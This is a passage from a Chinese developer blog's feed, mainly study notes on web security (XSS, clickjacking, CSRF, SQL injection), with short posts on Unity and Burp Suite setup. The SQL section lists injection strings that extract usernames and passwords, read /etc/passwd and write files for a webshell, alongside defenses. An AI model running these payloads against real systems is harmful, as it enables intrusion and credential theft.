class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">YAMLException: end of the stream or a document separator is expected at line 4, column 1:</span><br><span class="line">    - [x] 提交入职材料</span><br></pre></td></tr></table></figure></p><p>解决方案：在文章顶部增加下述代码</p><figure class="highlight md"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">---</span><br></pre></td></tr></table></figure><p>或者<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">abbrlink: &apos;0&apos;</span><br><span class="line">---</span><br></pre></td></tr></table></figure></p><p>更多解决方案，可参考：<a href="https://blog.csdn.net/yongf2014/article/details/50016783" rel="external nofollow noopener noreferrer" target="_blank">https://blog.csdn.net/yongf2014/article/details/50016783</a></p><h2 id="Q-amp-A"><a href="#Q-amp-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h2><p>Q：为什么全是链接？</p><p>A：既然已经现存方案，先不造轮子，后续若有时间，会将他们搬进来</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla
      
    
    </summary>
    
    
      <category term="hexo博客" scheme="http://yoursite.com/categories/hexo%E5%8D%9A%E5%AE%A2/"/>
    
    
      <category term="读书笔记" scheme="http://yoursite.com/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
      <category term="信息安全" scheme="http://yoursite.com/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>HTML5安全</title>
    <link href="http://yoursite.com/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/20190226-3458d19b.html"/>
    <id>http://yoursite.com/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/20190226-3458d19b.html</id>
    <published>2019-02-26T02:18:54.000Z</published>
    <updated>2021-04-08T03:18:06.353Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h1 id="信息安全"><a href="#信息安全" class="headerlink" title="信息安全"></a>信息安全</h1><h2 id="HTML5安全"><a href="#HTML5安全" class="headerlink" title="HTML5安全"></a>HTML5安全</h2><h3 id="新标签的XSS"><a href="#新标签的XSS" class="headerlink" title="新标签的XSS"></a>新标签的XSS</h3><h3 id="iframe的sandbox"><a href="#iframe的sandbox" class="headerlink" title="iframe的sandbox"></a>iframe的sandbox</h3><ul><li>allow-same-origin：允许同源访问</li><li>allow-top-navigation：允许访问顶层窗口</li><li>allow-forms：允许提交表单</li></ul><ul><li>allow-scripts：允许执行脚本<ul><li>即使设置了allow-scripts，也是不允许的，比如“弹出窗口”</li></ul></li></ul><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--例子--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">sandbox</span>=<span class="string">"allow-same-origin allow-forms allow-scripts"</span> <span class="attr">src</span>=<span class="string">"http://www.a.com/a.html"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Link-Types-：noreferrer"><a href="#Link-Types-：noreferrer" class="headerlink" title="Link Types ：noreferrer"></a>Link Types ：noreferrer</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--使用norferrer后，浏览器在请求该标签指定的地址时将不再发送Referer。--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"xxx"</span> <span class="attr">rel</span>=<span class="string">"noreferrer"</span> &gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="Canvas的妙用"><a href="#Canvas的妙用" class="headerlink" title="Canvas的妙用"></a>Canvas的妙用</h3><p>把图片导入Canvas，并进行转换。通过判断</p><h3 id="其他安全问题"><a href="#其他安全问题" class="headerlink" title="其他安全问题"></a>其他安全问题</h3><ul><li>Cross-Origin Resource Sharing：实现跨域请求<ul><li>XMLHttpRequest请求</li><li>XDomainRequest（用于IE8）</li></ul></li><li><p>Window.PostMessage（）方法可以安全地实现跨源通信。通常需同源才可以通信，但+Window.PostMessage（）方法提供了一种受控机制来规避此限制，只要正确的使用，这种方法就很安全。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">otherWindow.PostMessage（message，targetOrigin，[transfer]）;</span><br><span class="line"></span><br><span class="line">otherWindow：其他窗口的引用，比如iframe的contentWindow属性，执行<span class="built_in">window</span>.open返回的窗口对象，或是命名过数值索引的<span class="built_in">window</span>.frames。</span><br><span class="line"></span><br><span class="line">message：将要发送到其他<span class="built_in">window</span>的数据。</span><br><span class="line"></span><br><span class="line">targetOrigin：通过窗口的origin属性来指定哪些窗口能接收到消息事件，其值可以是字符串“*”（表示无限性）或者一个URI</span><br><span class="line"></span><br><span class="line">transfer：可选项，是一串和message同时传递的Transferable对象，这些对象的所有权将转移给消息接收方，而发送一方将不再保有所有权。</span><br><span class="line"></span><br><span class="line">示例：...postMessage(<span class="string">"hello"</span>,<span class="string">"http://www.a.com"</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">document</span>.domain：返回当前文档的域名，例：localhost或者www.a.com</span><br></pre></td></tr></table></figure></li><li><p>WebStorage</p><ul><li>类型<ul><li>Session Storage：关闭浏览器就会失效</li></ul><ul><li>Local Storage：一直存在</li></ul></li><li>设置、读取<ul><li>设置一个值：window.sessionStorage.setItem(key,value)</li><li>读取一个值：window.sessionStorage.getItem(key)</li></ul><ul><li>webStorage也受到同源策略的约束，每个域所拥有的信息只会保存在自己的域下。</li><li>与WebStorage相比，Cookie主要用于保存登陆凭证和少量信息，其最大长度的限制决定了不可能在Cookie中存储太多信息。于是W3C委员设计了WebStorage，能在客户端提供一个较为强大和方便的本地存储功能。</li></ul></li></ul></li></ul><hr><h2 id="XSS-跨站脚本攻击"><a href="#XSS-跨站脚本攻击" class="headerlink" title="XSS:跨站脚本攻击"></a>XSS:跨站脚本攻击</h2><p>xss攻击，通常指黑客通过“HTML注入”篡改了网页，插入了恶意的脚本，从而在用户浏览网页时，控制用户浏览器的一种攻击。</p><ul><li>反射型XSS:简单地把用户输入的数据“反射”给浏览器。</li><li>存储型XSS:把用户输入的数据“存储”到服务器端。</li><li>DOM Based XSS:特殊反射型XSS</li></ul><p>常用闭合手法，如 ‘ onclick = alert(/XSS/) //<br>‘用于闭合，//用于注释后面的</p><hr><h2 id="Secure-by-default原则"><a href="#Secure-by-default原则" class="headerlink" title="Secure by default原则"></a>Secure by default原则</h2><blockquote><p>“Secure by default”原则，也可以归纳为白名单、黑名单思想。</p></blockquote><h3 id="白名单"><a href="#白名单" class="headerlink" title="白名单"></a>白名单</h3><ul><li>如果网络只提供Web服务，那么正确的做法是只允许网站服务的80和443端口对外提供服务，屏蔽除此之外的其他端口。</li><li>在网站生产环境服务器上，应该限制随意安装软件，而需要制定统一的软件版本规范：根据业务需求，列出一个允许使用的软件以及软件版本的清单，在此清单外的软件则禁止。</li></ul><h3 id="黑名单"><a href="#黑名单" class="headerlink" title="黑名单"></a>黑名单</h3><ul><li>不允许SSH端口对外开放，那么审计SSH的默认端口：22端口是否开放Internet。</li></ul><hr><h2 id="ClickJacking-点击劫持"><a href="#ClickJacking-点击劫持" class="headerlink" title="ClickJacking-点击劫持"></a>ClickJacking-点击劫持</h2><blockquote><p>通过透明的frame覆盖在正常按键上面，欺骗点击</p></blockquote><blockquote><p>攻击者使用一个透明的、不可见的iframe，覆盖在一个网页上，然后诱导用户在该网页上进行操作，此时用户将在不知情下点击透明的iframe页面。</p></blockquote><ul><li><h4 id="Flash点击劫持"><a href="#Flash点击劫持" class="headerlink" title="Flash点击劫持"></a>Flash点击劫持</h4><ul><li>诱导点击打开摄像头</li></ul></li><li><h4 id="图片覆盖攻击"><a href="#图片覆盖攻击" class="headerlink" title="图片覆盖攻击"></a>图片覆盖攻击</h4><ul><li>类似透明iframe，把iframe换成一个虚假带链接的img。图片还可以伪造成一个正常的链接、按钮或文字等等。。</li></ul></li><li><h4 id="拖拽劫持与数据窃取"><a href="#拖拽劫持与数据窃取" class="headerlink" title="拖拽劫持与数据窃取"></a>拖拽劫持与数据窃取</h4><ul><li>网页小游戏，小海豹顶球。球为正常页面的iframe，但是被球隐藏了，小海豹头顶为textarea等可以窃取数据的接收方。</li></ul></li><li><h4 id="ClickJacking3-0-触屏劫持"><a href="#ClickJacking3-0-触屏劫持" class="headerlink" title="ClickJacking3.0 : 触屏劫持"></a>ClickJacking3.0 : 触屏劫持</h4><ul><li><h5 id="作用于移动端"><a href="#作用于移动端" class="headerlink" title="作用于移动端"></a>作用于移动端</h5></li></ul><ul><li><h5 id="防御ClickJacking"><a href="#防御ClickJacking" class="headerlink" title="防御ClickJacking"></a>防御ClickJacking</h5><ul><li>frame busting:禁止iframe嵌套</li></ul><ul><li>X-Frame-Options:Http头<ul><li>DENY:拒绝加载任何frame页面</li><li>SAMEORIGIN:frame同源域名下的页面</li><li>ALLOW-FROM:可以定义允许的frame加载的页面地址</li><li>Firefox的“Content Security”或者“NoScript扩展”等等…</li></ul></li></ul></li></ul><p>P3P头的副作用：如果网站返回给浏览器的HTTP头中包含有P3P头，则在某种程序上来说，将允许浏览器发送第三方Cookie。在IE即使是iframe或者script等标签也将不再拦截第三方Cookie的发送。</p></li></ul><hr><h2 id="CSRF-跨站点请求伪造"><a href="#CSRF-跨站点请求伪造" class="headerlink" title="CSRF-跨站点请求伪造"></a>CSRF-跨站点请求伪造</h2><blockquote><p>访问危害正常页面的其他页面中，存在危害正常页面的url</p></blockquote><h3 id="浏览器的Cookie策略"><a href="#浏览器的Cookie策略" class="headerlink" title="浏览器的Cookie策略"></a>浏览器的Cookie策略</h3><ul><li>Session Cookie：没有指定的Expire时间，浏览器关闭才失效。只要浏览器不关闭，可以在不同Tab页面共享。</li><li>Third-party Cookie（本地Cookie）：有指定的Expire时间，只有到了Expire时间才会失效，保存在本地。浏览器会阻止Third-party Cookie在不同域之间的页面的发送。</li></ul><blockquote><figure class="highlight plain"><figcaption><span>src</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br></pre></td><td class="code"><pre><span class="line">&gt; 浏览这个图片时，会对浏览器发送img的src里面的GET请求，从而达到删除idwei131的东西，而之所以能有权限删除，是因为用户成功登陆后，留下了Cookie。</span><br><span class="line"></span><br><span class="line">### CSRF的防御</span><br><span class="line"></span><br><span class="line">+ 验证码</span><br><span class="line">+ Referer Check</span><br><span class="line">  - 在互联网中最常见的应用就是“防止图片盗链”，也被用于检查请求是否来自合法的“源”</span><br><span class="line">  - Referer：是http的header的一部分，当浏览器向web服务器发送请求的时候，一般会带上Referer，告诉服务器我是从哪个页面链接过来的。</span><br><span class="line">+ Anti CSRF Token</span><br><span class="line">  - 现在业界针对CSRF的防御，一致做法是使用一个Token。</span><br><span class="line">+ CSRF的本质原因是重要操作的所有参数都是可以被攻击者猜测到的。</span><br><span class="line">  - 使用Token，Token的生成一定要足够随机，需要使用安全的随机数生成器生成Token。</span><br><span class="line">+ Token的使用原则</span><br><span class="line">  - 如果用户已经提交了表单，则这个Token已经消耗掉，应该再次重新生成一个新的Token。</span><br><span class="line">  - 考虑到如果一个用户打开多个相同的页面同时操作，当某个页面消耗掉Token后，其他页面的表单内保存的还是原本被消耗掉的那个Token</span><br><span class="line">    - 可以考虑生成多个有效的Token，以解决多页面共存的场景，</span><br><span class="line"></span><br><span class="line">----</span><br><span class="line"></span><br><span class="line">## 注入攻击</span><br><span class="line"></span><br><span class="line">#### SQL注入</span><br><span class="line"></span><br><span class="line">+ 关键条件</span><br><span class="line">  - 用户能够控制输入</span><br><span class="line">  - 原本程序原本要执行的代码，拼接了用户输入的数据。</span><br><span class="line">+ 例子：select * from 表  where 字段 = ‘  “+用户输入的数据+” ’ ;  </span><br><span class="line">  - 如果用户输入  jack;drop table 表--  则 select * from 表  where 字段 = ‘  jack;drop table 表-- ’ ;</span><br><span class="line">+ 在SQL注入中的过程中，如果网站的Web服务器开启了错误回显，则会为攻击者提供极大的便利。</span><br><span class="line"></span><br><span class="line">----</span><br><span class="line"></span><br><span class="line">#### 盲注（Blind Injection）</span><br><span class="line"></span><br><span class="line">对于web服务器关闭了错误回显，可以通过盲注攻击。盲注：在服务器没有错误回显时完成的注入攻击。构造简单的条件语句，根据返回页面是否发生变化，来判断SQL语句是否得到执行。</span><br><span class="line"></span><br><span class="line">##### 例子：</span><br><span class="line"></span><br><span class="line">http://www.a.com/index.php?id=1 相当于执行了SQL语句：select title,description,body from items where id =2</span><br><span class="line"></span><br><span class="line">若：http://www.a.com/index.php?id=1 and 1=2相当于执行了SQL语句：select title,description,body from items where id =2 and 1=2</span><br><span class="line">因为“and 1=2”为伪命题，所以这条“and”条件语句永远无法成立。对于web应用来说，也不会有结果返回给用户，只能看到结果为空或者一个错误页面。</span><br><span class="line">为了进一步确认注入是否存在，再次验证。因为一些处理逻辑或安全功能，在异常请求时会导致页面返回不正常。</span><br><span class="line"></span><br><span class="line">继续构造：http://www.a.com/index.php?id=1 and 1=1</span><br><span class="line">因为“and 1=1”为真命题，如果页面正常返回，则说明SQL语句的“and”成功执行，那么可以判断“id”参数存在SQL注入漏洞。</span><br><span class="line"></span><br><span class="line">----</span><br><span class="line"></span><br><span class="line">#### Timing Attack</span><br><span class="line"></span><br><span class="line">+ MYSQL函数：BENCHMARK( count，expr )</span><br><span class="line">  - 用于测试函数性能</span><br><span class="line">  - 函数的执行结果是将表达式expr执行count次。</span><br><span class="line">  - 利用BENCHMARK()函数，可以让同一个函数执行若干次，使得结果返回的时间比平时要长；通过时间长短的变化，可以判断出注入语句是否执行成功。这是一种边信道攻击，这个技巧在盲注中被称为Timing Attack。</span><br><span class="line"></span><br><span class="line">----</span><br><span class="line"></span><br><span class="line">### 数据库攻击技巧</span><br><span class="line"></span><br><span class="line">#### 常用的攻击技巧</span><br><span class="line"></span><br><span class="line">  + 猜解数据库对应版本</span><br><span class="line">    - http://www.a.com/news.php?id=5 and substring(@@version,1,1) = 4</span><br><span class="line">  +  利用union select分别确认表面admin是否存在，列名passwd是否存在</span><br><span class="line">    - id=5 union all select 1,2,3 from admin </span><br><span class="line">    - id=5 union all select 1,2,passwd from admin</span><br><span class="line">  + 进一步，想要猜出username和password具体的值，可以通过判断字符范围</span><br><span class="line">    - id=5 and ascii(substring(select concat(username,0x3a,passwd) from users limit 0,1),1,1) &gt;64 </span><br><span class="line">    - id=5 and ascii(substring(select concat(username,0x3a,passwd) from users limit 0,1),1,1) &gt;96</span><br><span class="line">    - id=5 and ascii(substring(select concat(username,0x3a,passwd) from users limit 0,1),1,1) &gt;100</span><br><span class="line">    - id=5 and ascii(substring(select concat(username,0x3a,passwd) from users limit 0,1),2,1) &gt;64 </span><br><span class="line">    - ......</span><br><span class="line">        + ascii()&gt;64</span><br><span class="line">          - 在ASCII码对照表中，十进制的65~90 对应字符 A~Z，十进制的97~122 对应字符 a~z</span><br><span class="line">        + substring(&quot;hello&quot;，1，2)</span><br><span class="line">          - 返回hello的第1至第2位：he</span><br><span class="line">        + substring(&quot;hello&quot;，2，1)</span><br><span class="line">          - 返回hello的第1位至第二位，但截取第1位，则返回：e</span><br><span class="line">        + concat(a,b,c)</span><br><span class="line">          - 合并字符，结果为：abc</span><br><span class="line">        + 0x3a</span><br><span class="line">          - 在ASCII码对照表中，十进制的58对应的十六进制是0x3a，其对应的字符是：“:”（冒号）</span><br><span class="line">        + limit(0，1)</span><br><span class="line">          - 0是偏移量，1是返回记录行的最大数目。所以检索的记录行是：从0到0+1</span><br><span class="line">  + 注入过程中，常常会用到一些读写文件的技巧</span><br><span class="line">    + 如果当前数据库用户拥有系统相应文件或目录的权限，则在mysql中，可以通过LOAD_FILE()读取系统文件，并通过INTO DUMPFILE写入本地文件。</span><br><span class="line">      - ... union select 1,1,LOAD_FILE(&apos;/etc/passwd&apos;),1,1;</span><br><span class="line">    + 如果当前数据库用户拥有创建表的权限，则可以通过LOAD_FILE()将系统文件读出，再通过INTO DUMPFILE将该文件写入系统中，然后通过LOAD DATA INFILE将文件导入创建的表中，最后就可以通过一般的注入技巧直接操作表数据了。 </span><br><span class="line">      - HEX（）函数：返回十六进制值的字符串表示形式。注意：并不是十进制转化为十六进制数，而是转化为字符串。。。</span><br><span class="line">      - CREATE TABLE 表名(...);</span><br><span class="line">     UNION SELECT 1,1HEX(LOAD_FILE(&apos;/ect/表名&apos;)),1,1 INTO DUMPFILE &apos;/tmp/表名&apos;；</span><br><span class="line">     LOAD DATA INFILE &apos;/tmp/表名&apos;  INTO TABLE 表名;</span><br><span class="line">    + 写入文件的技巧，经常被用于导出一个webshell，为攻击者的进一步攻击做铺垫。 </span><br><span class="line">  + 因此，在数据库安全方案设计时，可以禁止普通数据库用户具备操作文件的权限。</span><br><span class="line"></span><br><span class="line">#### 命令执行</span><br><span class="line"></span><br><span class="line">  - 利用”用户自定义函数“技巧，即UDF(User-Defined Functions)来执行命令。</span><br><span class="line">  + 一般来说，在数据库中执行系统命令，要求具有较高的权限。</span><br><span class="line">    - 在数据库加固时，可以参阅官方文档给出的安全指导文档。</span><br><span class="line">    - 在建立数据库账号时，应遵循”最小权限原则“，尽量避免给Web应用使用数据库的管理员权限。</span><br><span class="line"></span><br><span class="line">#### 攻击存储过程</span><br><span class="line"></span><br><span class="line">+ 除了存储过程直接攻击外，存储过程本身也可能会存在注入漏洞。</span><br><span class="line"></span><br><span class="line">#### 编码问题</span><br><span class="line"></span><br><span class="line">+ 要解决编码问题，需要统一数据库、操作系统、Web应用所使用的字符集，以避免各层对字符的理解存在差异。</span><br><span class="line">  - 统一设置为UTF-8是一个很好的方法。</span><br><span class="line">+ 基于字符集的攻击并不局限于SQL注入，凡是会解析数据的地方都可能存在此问题。</span><br><span class="line">  - 解决方法就是在HTML页面的&lt;code&gt;&lt;meta&gt;&lt;/code&gt;标签中指定当前页面的charset。</span><br><span class="line">+ 如果因为种种原因无法统一字符编码，则需要单独实现一个用于过滤或转义的安全函数。</span><br><span class="line">  - 根据系统所使用的不同字符集来限制用户输入数据的字符允许范围，以实现安全过滤。</span><br><span class="line"></span><br><span class="line">#### SQL Column Truncation</span><br><span class="line"></span><br><span class="line">+ 在MySQL的配置中，若sql_mode选项设置为default，即没有开启STRICT_ALL_TABLES选项时，MySQL对于用户插入的超长值只会提示warning，而不是error。(如果是error则插入不成功)</span><br><span class="line">  + 开启strict模式，在strict模式下，输入的字符超出长度限制，数据库返回一个error信息，同时插入不超过。</span><br><span class="line">  + 关闭strict模式，数据库只返回warning信息，但数据插入成功。</span><br></pre></td></tr></table></figure></blockquote><p>  insert into 表（’username’,’password’）values(‘admin                                                   x’,’123456’);</p><p>  // 注册一个用户名为“admin（55个空格）x”的用户，就可以修改原管理员密码了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">#### 正确地防御SQL注入</span><br><span class="line"></span><br><span class="line">+ 条件</span><br><span class="line">  - 找到所有SQL注入漏洞</span><br><span class="line">  - 修补这些漏洞</span><br><span class="line">+ 只对用户输入做一些escape处理还不够。处理包括“空格”、“括号”在内的一些特殊字符，以及一些SQL保留字，比如SELECT、INSERT等也不够。</span><br><span class="line">  - 使用预编译语句</span><br><span class="line">  - 防御SQL注入的最佳方式，就是使用预编译语句，绑定变量。</span><br><span class="line">  - 使用预编译的SQL语句，SQL语句的语义不会发生改变。在SQL语句中，变量用？表示，攻击者无法改变SQL的结构。</span><br><span class="line">  - php绑定变量示例：</span><br></pre></td></tr></table></figure></p><pre><code>$query = &quot;INSERT INTO 表(Name,Age,Sex) VALUES(?,?,?)&quot;;$stmt = $mysqli -&gt; prepare($query);$stmt-&gt;bind_param(&quot;sis&quot;,$val1,$val2,$val3);$val1 = &apos;jack&apos;;$val2 = &apos;12&apos;;$val3 = &apos;boy&apos;;$stmt-&gt;execute();</code></pre><p><code>`</code></p><ul><li>对于bind_param()的“sis”：<pre><code>- i /- integer（整型）</code></pre><ul><li>d /- double（双精度浮点型）</li><li>s /- string  （字符串）</li><li>b /- BLOB  （布尔型）</li></ul></li></ul>]]></content>
    
    <summary type="html">
    
      学习笔记
    
    </summary>
    
    
      <category term="读书笔记" scheme="http://yoursite.com/categories/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="读书笔记" scheme="http://yoursite.com/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
      <category term="信息安全" scheme="http://yoursite.com/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>unity5.x 创造2D手机游戏</title>
    <link href="http://yoursite.com/%E6%B8%B8%E6%88%8F%E5%BC%80%E5%8F%91/20190225-354e7010.html"/>
    <id>http://yoursite.com/%E6%B8%B8%E6%88%8F%E5%BC%80%E5%8F%91/20190225-354e7010.html</id>
    <published>2019-02-25T13:04:37.000Z</published>
    <updated>2021-04-08T03:18:06.352Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>书本：《unity 5.x创造2D手机游戏》</p></blockquote><p>在大三下学期,用了两周左右,啃了一下《unity 5.x创造2D手机游戏》，弄了个小游戏。用思维导图整理了一下读书笔记。</p><h5 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h5><p><img src="/images/page/note/Unity5.x_2D_Game.png" alt="读书笔记"></p><h5 id="游戏截图"><a href="#游戏截图" class="headerlink" title="游戏截图"></a>游戏截图</h5><p><img src="/images/page/note/unity5.x_1.jpg" alt="游戏实际效果"></p>]]></content>
    
    <summary type="html">
    
      学习笔记
    
    </summary>
    
    
      <category term="游戏开发" scheme="http://yoursite.com/categories/%E6%B8%B8%E6%88%8F%E5%BC%80%E5%8F%91/"/>
    
    
      <category term="Unity" scheme="http://yoursite.com/tags/Unity/"/>
    
      <category term="读书笔记" scheme="http://yoursite.com/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
      <category term="Game" scheme="http://yoursite.com/tags/Game/"/>
    
      <category term="2D Game" scheme="http://yoursite.com/tags/2D-Game/"/>
    
      <category term="手游" scheme="http://yoursite.com/tags/%E6%89%8B%E6%B8%B8/"/>
    
  </entry>
  
  <entry>
    <title>配置Burp Suite</title>
    <link href="http://yoursite.com/%E9%85%8D%E7%BD%AE/20190225-b040eaec.html"/>
    <id>http://yoursite.com/%E9%85%8D%E7%BD%AE/20190225-b040eaec.html</id>
    <published>2019-02-25T11:52:26.000Z</published>
    <updated>2021-04-08T03:18:06.380Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h3 id="方法"><a href="#方法" class="headerlink" title="方法"></a>方法</h3><h4 id="工具"><a href="#工具" class="headerlink" title="工具:"></a>工具:</h4><ul><li>火狐浏览器</li><li>Burp Suite</li></ul><h4 id="先打开Burp-Suite"><a href="#先打开Burp-Suite" class="headerlink" title="先打开Burp Suite"></a>先打开Burp Suite</h4><p><img src="/images/page/note/1_1.png" alt="配置如图"></p><h4 id="再到火狐中配置代理"><a href="#再到火狐中配置代理" class="headerlink" title="再到火狐中配置代理"></a>再到火狐中配置代理</h4><p><img src="/images/page/note/1_2.png" alt="配置如图"></p><h4 id="访问：http-burp-并下载CA证书"><a href="#访问：http-burp-并下载CA证书" class="headerlink" title="访问：http://burp/并下载CA证书"></a>访问：<a href="http://burp/并下载CA证书" rel="external nofollow noopener noreferrer" target="_blank">http://burp/并下载CA证书</a></h4><p><img src="/images/page/note/1_3.png" alt="http://burp/"></p><h4 id="导入证书"><a href="#导入证书" class="headerlink" title="导入证书"></a>导入证书</h4><p><img src="/images/page/note/1_4.png" alt="http://burp/"></p><h4 id="勾选第一个"><a href="#勾选第一个" class="headerlink" title="勾选第一个"></a>勾选第一个</h4><p><img src="/images/page/note/1_5.png" alt="如图"></p><h4 id="可以开始抓包了"><a href="#可以开始抓包了" class="headerlink" title="可以开始抓包了"></a>可以开始抓包了</h4><p><img src="/images/page/note/1_6.png" alt="可以搭配火狐浏览器使用Burp Suite了"></p><hr><h3 id="新版火狐浏览器"><a href="#新版火狐浏览器" class="headerlink" title="新版火狐浏览器:"></a>新版火狐浏览器:</h3><h4 id="新版火狐在选项-常规中配置代理"><a href="#新版火狐在选项-常规中配置代理" class="headerlink" title="新版火狐在选项-常规中配置代理"></a>新版火狐在选项-常规中配置代理</h4><p><img src="/images/page/note/1_7.png" alt="如图"></p><h4 id="在隐私与安全中配置CA证书"><a href="#在隐私与安全中配置CA证书" class="headerlink" title="在隐私与安全中配置CA证书"></a>在隐私与安全中配置CA证书</h4><p><img src="/images/page/note/1_8.png" alt="如图"></p>]]></content>
    
    <summary type="html">
    
      配置笔记
    
    </summary>
    
    
      <category term="配置" scheme="http://yoursite.com/categories/%E9%85%8D%E7%BD%AE/"/>
    
    
      <category term="配置" scheme="http://yoursite.com/tags/%E9%85%8D%E7%BD%AE/"/>
    
      <category term="常用工具" scheme="http://yoursite.com/tags/%E5%B8%B8%E7%94%A8%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>WeBug3.0练习笔记</title>
    <link href="http://yoursite.com/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/20190225-2df38590.html"/>
